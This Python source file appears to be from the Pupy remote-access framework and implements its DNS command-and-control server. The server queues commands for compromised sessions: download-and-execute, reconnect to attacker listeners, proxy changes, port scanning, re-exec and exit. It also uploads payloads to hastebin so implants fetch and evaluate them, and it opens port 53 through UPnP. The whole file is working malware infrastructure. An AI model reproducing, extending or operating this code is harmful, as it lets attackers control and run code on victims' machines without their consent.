# -*- coding: utf-8 -*-
import logging
from PupyCredentials import Credentials
from network.lib.picocmd.server import *
from network.lib.picocmd.picocmd import *
from Queue import Queue

from pupylib.PupyConfig import PupyConfig
from pupylib.utils.network import get_listener_ip_with_local, get_listener_port

from pupylib.PupyOffload import PupyOffloadManager

import requests
import netifaces
import socket

from urlparse import urlparse

from os import path

from network.lib.igd import IGDClient, UPNPError

class PupyDnsCommandServerHandler(DnsCommandServerHandler):
    def __init__(self, *args, **kwargs):
        if 'config' in kwargs:
            self.config = kwargs.get('config')
            del kwargs['config']
        else:
            self.config = None

        DnsCommandServerHandler.__init__(self, *args, **kwargs)

    def onlinestatus(self, node=None, default=False):
        return self.add_command(OnlineStatusRequest(), session=node, default=default)

    def scan(self, host, first, last, node=None, default=False):
        return self.add_command(CheckConnect(host, first, last), session=node, default=default)

    def connect(self, hosts, port, transport, node=None, default=False):
        commands = [
            Connect(host, port, transport) for host in hosts
        ]

        applied = 0
        for command in commands:
            applied = self.add_command(command, session=node, default=default)

        return applied

    def disconnect(self, node=None, default=False):
        return self.add_command(Disconnect(), session=node, default=default)

    def reexec(self, node=None, default=False):
        return self.add_command(Reexec(), session=node, default=default)

    def sleep(self, timeout, node=None, default=False):
        return self.add_command(Sleep(timeout), session=node, default=default)

    def exit(self, node=None, default=False):
        return self.add_command(Exit(), session=node, default=default)

    def proxy(self, uri, node=None, default=False):
        if not uri or uri.lower() in ('none', 'off', 'no', 'disable'):
            return self.add_command(
                SetProxy('none', '0.0.0.0', 0),
                session=node, default=default
            )
        elif uri.lower() in ('on', 'enable', 'yes'):
            return self.add_command(
                SetProxy('any', '0.0.0.0', 0),
                session=node, default=default
            )

        if not '://' in uri:
            uri = 'http://' + uri

        parsed = urlparse(uri)
        return self.add_command(
            SetProxy(
                parsed.scheme,
                parsed.hostname,
                parsed.port or 3128,
                user=parsed.username,
                password=parsed.password
            ),
            session=node, default=default
        )

    def dexec(self, url, action, proxy=False, node=None, default=None):
        return self.add_command(
            DownloadExec(url, action=action, proxy=proxy),
            session=node, default=default
        )

    def pastelink(self, url, action, node=None, default=None):
        return self.add_command(
            PasteLink(url, action=action),
            session=node, default=default
        )

    def find_sessions(self, spi=None, node=None):
        if spi or node:
            results = []
            if self.config and node:
                if type(node) in (str,unicode):
                    nodes = []
                    for n in node.split(','):
                        try:
                            int(n, 16)
                            nodes.append(n)
                        except:
                            for tagged in self.config.by_tags(n):
                                nodes.append(tagged)

                    if nodes:
                        results = DnsCommandServerHandler.find_sessions(
                            self, node=','.join(nodes)
                        )
                    else:
                        results = []

            if spi:
                if type(spi) in (str,unicode):
                    spis = []
                    for s in spi.split(','):
                        try:
                            int(s, 16)
                            spis.append(s)
                        except:
                            pass

                    if spis:
                        results += DnsCommandServerHandler.find_sessions(
                            self, spi=','.join(spis)
                        )
        else:
            results = DnsCommandServerHandler.find_sessions(self)

        return results


class PupyDnsCnc(object):
    def __init__(
            self, igd=None,
            recursor=None,
            config=None,
            credentials=None,
            listeners=None,
            cmdhandler=None,
        ):

        credentials = credentials or Credentials()
        config = config or PupyConfig()

        self.config = config
        self.credentials = credentials
        self.igd = igd
        self.listeners = listeners
        self.cmdhandler = cmdhandler

        fdqn = self.config.get('pupyd', 'dnscnc').split(':')
        domain = fdqn[0]
        if len(fdqn) > 1:
            port = int(fdqn[1])
        else:
            port = 53

        listen = str(config.get('pupyd', 'address') or '0.0.0.0')
        prefer_external = config.getboolean('gen', 'external')

        recursor = config.get('pupyd', 'recursor')
        if recursor and recursor.lower() in ('no', 'false', 'stop', 'n', 'disable'):
            recursor = None

        self.dns_domain = domain
        self.dns_port = port
        self.dns_listen = listen
        self.dns_recursor = recursor
        self.handler = PupyDnsCommandServerHandler(
            domain,
            credentials['DNSCNC_PRIV_KEY'],
            recursor=recursor,
            config=self.config
        )

        offload_server = config.get('pupyd', 'offload_server')
        offload_psk = config.get('pupyd', 'offload_psk')

        if offload_server and offload_psk:
            try:
                manager = PupyOffloadManager(offload_server, offload_psk)
                self.server = manager.dns(self.handler, domain)
            except Exception, e:
                logging.exception(e)

        else:
            self.server = DnsCommandServer(
                self.handler,
                address=listen,
                port=int(port)
            )

            if self.igd and self.igd.available:
                self.igd.AddPortMapping(53, 'UDP', int(port))
                self.igd.AddPortMapping(53, 'TCP', int(port))

        self.server.start()

    def stop(self):
        self.server.stop()

    def list(self, node=None):
        return self.handler.find_sessions(node=node) \
          or self.handler.find_sessions(spi=node)

    def connect(self, host=None, port=None, transport=None, node=None, default=False):
        if port:
            port = int(port)

        if not all([host, port, transport]):
            listeners = self.listeners()
            if not listeners:
                raise ValueError(
                    'No active listeners. Host, port and transport shoul be explicitly specified')

            listener = None
            local = False

            if transport:
                listener = listeners.get(transport)
                if not listener:
                    raise ValueError('Listener for transport {} not found'.format(transport))

            else:
                for l in listeners.itervalues():
                    if not l.local or ( port and ( l.port == port or l.external_port == port ) ):
                        listener = l
                        break

                if not listener:
                    listener = next(listeners.itervalues())
                    local = True

            if not listener:
                raise ValueError('No listeners found')

            if local:
                _port = get_listener_port(self.config, external=True)
                _host, local = get_listener_ip_with_local(
                    config=self.config, external=True, igd=self.igd)

                if local:
                    raise ValueError(
                        'External host:port not found. '
                        'Please explicitly specify either port or host, port and transport.')

                host = host or _host
                port = port or _port
                transport = listener.name
            else:
                host = host or listener.external
                port = port or listener.external_port
                transport = listener.name

            if self.cmdhandler:
                self.cmdhandler.display_success('Connect: Transport: {} Host: {} Port: {}'.format(
                    transport, host, port))

        return self.handler.connect(
            [ host ], port, transport,
            node=node,
            default=default
        )

    def scan(self, *args, **kwargs):
        return self.handler.scan(*args, **kwargs)

    def onlinestatus(self, **kwargs):
        return self.handler.onlinestatus(**kwargs)

    def disconnect(self, **kwargs):
        return self.handler.disconnect(**kwargs)

    def exit(self, **kwargs):
        return self.handler.exit(**kwargs)

    def sleep(self, *args, **kwargs):
        return self.handler.sleep(*args, **kwargs)

    def reexec(self, **kwargs):
        return self.handler.reexec(**kwargs)

    def reset(self, **kwargs):
        return self.handler.reset_commands(**kwargs)

    def dexec(self, *args, **kwargs):
        return self.handler.dexec(*args, **kwargs)

    def proxy(self, *args, **kwargs):
        return self.handler.proxy(*args, **kwargs)

    def pastelink(self, content=None, url=None, action='pyeval', node=None, default=False):
        if not ( content or url ):
            raise ValueError('content and url args are empty')

        if content and url:
            raise ValueError('both content and url are selected')

        if content:
            content_path = path.expanduser(path.expandvars(content))
            if not path.exists(content_path):
                raise ValueError('no such file: {}'.format(content_path))

            payload = b''
            # TODO: add more providers
            with open(content_path) as content:
                payload = self.handler.encode_pastelink_content(content.read())

            response = requests.post('https://hastebin.com/documents', data=payload)
            if response.ok:
                key = response.json()['key']
                url = 'https://hastebin.com/raw/{}'.format(key)

        if not url:
            raise ValueError('couldn\'t create pastelink url')

        count = self.handler.pastelink(url, action, node=node, default=default)
        if count and self.cmdhandler:
            self.cmdhandler.display_success('Pastelink: Url: {} Action: {}'.format(
                url, action))

        return count, url

    @property
    def policy(self):
        return {
            'interval': self.handler.interval,
            'timeout': self.handler.timeout,
            'kex': self.handler.kex,
        }

    def set_policy(self, *args, **kwargs):
        return self.handler.set_policy(*args, **kwargs)

    @property
    def dirty(self):
        count = 0
        for session in self.handler.find_sessions():
            if session.commands:
                count += 1
        return count

    @property
    def count(self):
        return len(self.handler.sessions)

    @property
    def commands(self):
        return self.handler.commands
